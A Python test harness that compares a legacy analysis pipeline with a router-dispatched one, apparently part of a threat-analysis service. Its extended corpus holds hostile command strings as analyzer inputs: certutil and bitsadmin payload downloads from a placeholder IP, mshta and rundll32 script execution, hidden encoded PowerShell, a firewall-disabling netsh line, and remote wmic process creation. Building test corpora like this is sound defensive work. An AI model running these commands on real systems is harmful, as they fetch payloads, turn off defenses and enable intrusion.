"""Equivalence harness · Legacy vs Router-dispatched execution (ADR-0014e).

Owner directive (2026-02-15):
  • This is a DIAGNOSTIC ONLY.  It is NOT a cutover mechanism.
  • Compare `analyze() → generate_report()` (LEGACY) against
    `plan_to_execution_steps() → execute_plan()` (ROUTER) across the
    four frozen M0a corpus inputs.
  • Report differences at every layer.  Do NOT normalise them away.
  • Classify each difference.  Owner reviews the report before any
    cutover decision.

Structure of a single-input harness record:
  {
    "input"           : { "name", "text_head" },
    "legacy"          : { envelope_hash, envelope_keys, report_section_titles, ... },
    "router"          : { projected_steps, outcomes[], plumbing_gaps[], ... },
    "differences"     : {
        "identical"          : [...],
        "expected_additive"  : [...],
        "expected_structural": [...],
        "unexpected"         : [...],
        "missing_capability" : [...],
        "duplicate_execution": [...],
        "ordering"           : [...],
        "failure_semantics"  : [...],
    },
    "verdict"         : "GO" | "NO-GO" | "GAPS-REQUIRE-MIGRATION",
  }

The harness does NOT modify any production code, adapter, analyzer,
router, projection, or IUE.  It reads them and reports.
"""
from __future__ import annotations

import hashlib
import json
from dataclasses import asdict, replace
from typing import Any, Dict, List

from services.die.input_understanding import understand
from services.die.api import analyze as die_analyze
from services.die.narrative import generate_report
from services.registry.iue_projection import plan_to_execution_steps
from services.registry.router import ExecutionStep, StepStatus, execute_plan


# ── Frozen M0a corpus (identical to test_m0a_iue_contract_freeze) ──
M0A_CORPUS = {
    "bare_url_medium_style": "https://systemweakness.com/some-report",
    "powershell_naked":      "powershell.exe -EncodedCommand SGVsbG8=",
    "plain_english_short":   "the quick brown fox jumps over the lazy dog",
    "hex_ratio_long":        "4d5a" + "90" * 260,
}


# ── Extended corpus (owner note 2026-02-15: "test not only sample1") ──
# Diverse real-world payloads.  Same guarantees hold as for M0A_CORPUS:
#   • harness never mutates production code
#   • no scope creep — still string inputs mapped to existing capabilities
#   • no expected-hash lock (extended corpus is exploratory equivalence
#     evidence, not a regression baseline)
EXTENDED_CORPUS = {
    "lolbas_certutil_download":
        "certutil.exe -urlcache -split -f http://198.51.100.20/payload.exe %TEMP%\\a.exe",
    "lolbas_bitsadmin_transfer":
        "bitsadmin /transfer j http://198.51.100.20/ps.txt %APPDATA%\\p.ps1",
    "lolbas_mshta_javascript":
        "mshta.exe javascript:a=new%20ActiveXObject(\"WScript.Shell\");a.Run(\"calc.exe\");close();",
    "lolbas_rundll32_javascript":
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");",
    "cmd_chain_amp":
        "whoami && net user && ipconfig /all",
    "powershell_encoded_realistic":
        "powershell -nop -w hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=",
    "base64_wrapping_iocs":
        "aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vcGF5bG9hZC5leGUgZGVsaXZlcnMgYSByYW5zb213YXJl",  # b64 of a real-ish sentence
    "narrative_short_attack":
        ("The actor deployed a remote access trojan and used PowerShell "
          "to execute an encoded command that reached out to a C2 server."),
    "netsh_firewall_off":
        "netsh advfirewall set allprofiles state off",
    "wmic_process_create":
        "wmic /node:target process call create \"cmd.exe /c whoami\"",
    "url_with_suspicious_path":
        "https://example-cdn.attacker.test/download/payload.hta",
    "empty_input":
        "",
}


def _sha256(obj: Any) -> str:
    return hashlib.sha256(
        json.dumps(obj, default=str, sort_keys=True).encode()).hexdigest()


# ────────────────────────────────────────────────────────────────────
#   Legacy path — the current production sequence
# ────────────────────────────────────────────────────────────────────
def run_legacy(text: str) -> Dict[str, Any]:
    """Direct in-line invocation of the existing pipeline."""
    env    = die_analyze(text)
    report = generate_report(env, case_id="", input_preview=text[:80])
    return {
        "envelope":               env,
        "envelope_hash":          _sha256(env),
        "envelope_keys":          sorted(env.keys()),
        "report":                 report,
        "report_hash":            _sha256(report),
        "report_section_titles":  [s["title"] for s in report.get("sections", [])],
    }


# ────────────────────────────────────────────────────────────────────
#   Router path — dispatch via M0d execute_plan()
# ────────────────────────────────────────────────────────────────────
def _populate_step_inputs(step: ExecutionStep,
                           text: str,
                           outputs_by_step: Dict[str, Any]) -> ExecutionStep:
    """HARNESS-SCOPE: fill each step's `inputs` from prior results.

    Real M0f-style wiring would require the router or projection to know
    which output field of a producing step feeds which input parameter of
    a consuming step.  The M0d router does not have that plumbing today
    and M0e's projection deliberately did not add it (that would drift
    into analyzer-shape awareness).  The harness fills the gap MANUALLY
    and reports it as `plumbing_gap` in the differences.
    """
    eid = step.entry_id
    if eid == "die.command.v1":
        return replace(step, inputs={"src": text})
    if eid == "die.recursive.v1":
        return replace(step, inputs={"src": text})
    if eid == "report.narrative.v1":
        # Depends on a die.command.v1 outcome — harness plumbs the env.
        env = None
        for dep_id in step.depends_on:
            out = outputs_by_step.get(dep_id)
            if isinstance(out, dict) and "language" in out:
                env = out
                break
        return replace(step, inputs={"env": env or {}, "case_id": "",
                                       "input_preview": text[:80]})
    if eid == "ioc_enrichment.v1":
        # Signature: enrich_iocs(iocs, keys, max_per_type=6).  The legacy
        # path calls this from inside routers/analyze.py with a resolved
        # `iocs` dict and TI keys.  Router-dispatched invocation has
        # neither in scope — HARNESS DOCUMENTS THE GAP.
        return replace(step, inputs={
            "iocs": {"url": [text] if text.startswith("http") else []},
            "keys": {},
        })
    if eid == "artifact.intel.v1":
        # Takes bytes; not exercised by M0a corpus (all text inputs).
        return replace(step, inputs={"data": text.encode()})
    return step


def run_router(text: str) -> Dict[str, Any]:
    """Router-dispatched execution.

    Steps are pre-populated by the harness because the M0e projection
    intentionally leaves `inputs={}`.  The router itself is unchanged.
    """
    u    = understand(text, execute=False)
    proj = plan_to_execution_steps(u)

    # Populate inputs one step at a time so `report.narrative.v1` can
    # see the outcome of `die.command.v1`.  We first run steps that
    # don't need dep-output, then fill dependents from their outputs.
    outputs_by_step: Dict[str, Any] = {}
    ordered_outcomes: List[Dict[str, Any]] = []
    plumbing_gaps: List[Dict[str, str]] = []

    for step in proj.steps:
        # Plumb inputs at execution time.
        step_with_inputs = _populate_step_inputs(step, text, outputs_by_step)
        if step.inputs == {} and step_with_inputs.inputs != {}:
            plumbing_gaps.append({
                "step_id":  step.step_id,
                "entry_id": step.entry_id,
                "note":     "M0e projection emits inputs={}. Harness populated "
                            "kwargs at execution time. Router has no "
                            "output→input pipe primitive today.",
            })
        # Strip depends_on for single-step invocation — the harness
        # plumbs deps MANUALLY (see the plumbing_gap note above).
        # This documents the router-layer limitation without
        # artificially blocking dependents.
        step_no_deps = replace(step_with_inputs, depends_on=frozenset())
        outcomes = execute_plan([step_no_deps])
        assert len(outcomes) == 1
        outcome = outcomes[0]
        outputs_by_step[step.step_id] = outcome.result
        ordered_outcomes.append({
            "step_id":     outcome.step_id,
            "entry_id":    outcome.entry_id,
            "status":      outcome.status.value,
            "implementation": outcome.implementation,
            "result_hash": _sha256(outcome.result) if outcome.result is not None else None,
            "error":       outcome.error,
            "error_type":  outcome.error_type,
        })

    return {
        "projected_steps":  [(s.step_id, s.entry_id) for s in proj.steps],
        "unmapped_engines": proj.unmapped_engines,
        "outcomes":         ordered_outcomes,
        "plumbing_gaps":    plumbing_gaps,
        "envelope":         _find_output_by_entry(outputs_by_step, "die_command_v1"),
        "report":           _find_output_by_entry(outputs_by_step, "report_narrative_v1"),
    }


def _find_output_by_entry(outputs: Dict[str, Any], entry_id_suffix: str) -> Any:
    for k, v in outputs.items():
        if entry_id_suffix in k:
            return v
    return None


# ────────────────────────────────────────────────────────────────────
#   Difference engine
# ────────────────────────────────────────────────────────────────────
def _classify_differences(name: str, legacy: Dict, router: Dict) -> Dict[str, list]:
    diffs: Dict[str, list] = {
        "identical":            [],
        "expected_additive":    [],
        "expected_structural":  [],
        "unexpected":           [],
        "missing_capability":   [],
        "duplicate_execution":  [],
        "ordering":             [],
        "failure_semantics":    [],
    }

    # 1. envelope byte-identity for capabilities that ran through the router
    router_env = router.get("envelope")
    if router_env is None:
        # No die.command.v1 executed via router (e.g. url_only case) —
        # the router path never produced an envelope.
        diffs["missing_capability"].append({
            "axis": "envelope",
            "note": ("router path never produced a DIE envelope for input "
                      f"{name!r} — legacy path always produces one via "
                      "services.die.api:analyze"),
        })
    else:
        legacy_hash = legacy["envelope_hash"]
        router_hash = _sha256(router_env)
        if legacy_hash == router_hash:
            diffs["identical"].append({
                "axis": "die.command.v1 envelope",
                "hash": legacy_hash,
                "note": "router-dispatched invocation is byte-identical to inline",
            })
        else:
            diffs["unexpected"].append({
                "axis":         "die.command.v1 envelope",
                "legacy_hash":  legacy_hash,
                "router_hash":  router_hash,
                "note":         "router-dispatched envelope differs from inline — "
                                "investigate before cutover",
            })

    # 2. report byte-identity
    router_report = router.get("report")
    legacy_report_hash = legacy["report_hash"]
    if router_report is None:
        diffs["missing_capability"].append({
            "axis": "report.narrative.v1",
            "note": ("router path never produced a report for input "
                      f"{name!r} — report.narrative.v1 either did not run "
                      "or produced None"),
        })
    else:
        router_report_hash = _sha256(router_report)
        if legacy_report_hash == router_report_hash:
            diffs["identical"].append({
                "axis": "report.narrative.v1 output",
                "hash": legacy_report_hash,
            })
        else:
            diffs["unexpected"].append({
                "axis":         "report.narrative.v1 output",
                "legacy_hash":  legacy_report_hash,
                "router_hash":  router_report_hash,
            })

    # 3. structural: legacy runs 2 top-level calls; router runs N steps
    n_router_success = sum(1 for o in router["outcomes"]
                            if o["status"] == StepStatus.SUCCESS.value)
    diffs["expected_structural"].append({
        "axis":        "call graph",
        "legacy":      "analyze() → generate_report()",
        "router":      f"{n_router_success} router-dispatched successes over "
                       f"{len(router['outcomes'])} steps",
        "note":        "router path decomposes the pipeline; legacy is 2 inline calls",
    })

    # 4. plumbing gaps (M0d has no output→input pipe primitive)
    for gap in router["plumbing_gaps"]:
        diffs["missing_capability"].append({
            "axis": "router plumbing",
            "step": gap["step_id"],
            "note": gap["note"],
        })

    # 5. unmapped legacy engines (class-B stages)
    if router["unmapped_engines"]:
        diffs["expected_structural"].append({
            "axis":            "unmapped legacy engines (class-B bundled)",
            "unmapped":        router["unmapped_engines"],
            "note":            "these stages run inside die.command.v1 or "
                                "report.narrative.v1 as sub-behaviour "
                                "(per ADR-0014d classification)",
        })

    # 6. ordering — legacy is fixed 2-call sequence; router topo-sorts
    router_order = [o["step_id"] for o in router["outcomes"]]
    diffs["ordering"].append({
        "axis":  "execution order",
        "legacy": ["analyze", "generate_report"],
        "router": router_order,
    })

    # 7. failure semantics
    router_failures = [o for o in router["outcomes"]
                        if o["status"] != StepStatus.SUCCESS.value]
    if router_failures:
        diffs["failure_semantics"].append({
            "axis":     "router step failures",
            "failures": [{"step_id": f["step_id"],
                           "status":  f["status"],
                           "error":   f["error"]}
                          for f in router_failures],
            "note":     "legacy path collapses these into a single "
                        "analyze() call so the same failures may or may "
                        "not surface identically",
        })

    # 8. router does not support async dispatch — coroutine results
    #    indicate the callable is async but the router invoked it
    #    synchronously.  Report as a router-layer limitation.
    import inspect as _insp
    for o in router["outcomes"]:
        # Inspect by re-resolving the implementation and checking
        # `iscoroutinefunction` (deterministic, cheap).
        impl = o["implementation"] or ""
        if impl:
            mod_name, _, attr = impl.partition(":")
            try:
                import importlib as _il
                m = _il.import_module(mod_name)
                fn = getattr(m, attr, None)
                if fn and _insp.iscoroutinefunction(fn):
                    diffs["unexpected"].append({
                        "axis":        "async dispatch",
                        "step_id":     o["step_id"],
                        "entry_id":    o["entry_id"],
                        "impl":        impl,
                        "note":        ("callable is async (`async def`) but "
                                          "M0d router invokes it synchronously "
                                          "and captures the coroutine object as "
                                          "`result`. Router lacks async support today. "
                                          "This is a M0d/M0f-blocking gap."),
                    })
            except Exception:
                pass

    return diffs


# ────────────────────────────────────────────────────────────────────
#   Public entry-point
# ────────────────────────────────────────────────────────────────────
def run_equivalence_harness(corpus: Dict[str, str] | None = None) -> Dict[str, Any]:
    if corpus is None:
        corpus = M0A_CORPUS
    records = []
    for name, text in corpus.items():
        legacy = run_legacy(text)
        router = run_router(text)
        diffs  = _classify_differences(name, legacy, router)

        n_identical  = len(diffs["identical"])
        n_missing    = len(diffs["missing_capability"])
        n_unexpected = len(diffs["unexpected"])
        if n_unexpected == 0 and n_missing == 0:
            verdict = "GO"
        elif n_unexpected == 0 and n_missing > 0:
            verdict = "GAPS-REQUIRE-MIGRATION"
        else:
            verdict = "NO-GO"

        records.append({
            "input": {
                "name":      name,
                "text_head": text[:80],
                "iue_engines_selected": (
                    list(understand(text, execute=False).engines_selected)),
            },
            "legacy": {
                "envelope_hash":         legacy["envelope_hash"],
                "envelope_keys":         legacy["envelope_keys"],
                "report_section_titles": legacy["report_section_titles"],
                "report_hash":           legacy["report_hash"],
            },
            "router": {
                "projected_steps":  router["projected_steps"],
                "unmapped_engines": router["unmapped_engines"],
                "outcomes":         router["outcomes"],
                "plumbing_gaps":    router["plumbing_gaps"],
            },
            "differences":  diffs,
            "verdict":      verdict,
        })
    overall = _overall_verdict(records)
    return {"records": records, "overall_verdict": overall}


def _overall_verdict(records: List[Dict]) -> str:
    verdicts = {r["verdict"] for r in records}
    if verdicts == {"GO"}:
        return "GO"
    if "NO-GO" in verdicts:
        return "NO-GO"
    return "GAPS-REQUIRE-MIGRATION"
